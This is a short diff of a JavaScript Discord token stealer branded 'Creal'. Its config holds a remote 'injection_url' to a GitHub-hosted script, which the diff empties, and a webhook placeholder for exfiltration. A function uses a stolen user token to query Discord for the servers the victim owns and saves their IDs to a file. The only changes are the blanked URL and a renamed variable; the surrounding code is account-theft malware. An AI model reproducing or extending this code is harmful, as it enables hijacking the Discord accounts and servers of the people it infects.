@@ -26,7 +26,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js",
+    injection_url: "",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
@@ -496,8 +496,8 @@ async function getservers(token) {
     var guilds = await getFromURL("https://discord.com/api/v8/users/@me/guilds", token)
     await guilds.filter(a => a.owner == true && a.icon).forEach(async a => {
         if (a.icon == null) return
-        let blackcapedidguild = a.id;
-        saveidtofile(blackcapedidguild, "Creal_guilds_ids.txt");
+        let Crealidguild = a.id;
+        saveidtofile(Crealidguild, "Creal_guilds_ids.txt");
     });
     setTimeout(async () => {
         if (fs.existsSync('Creal_guilds_ids.txt')) {
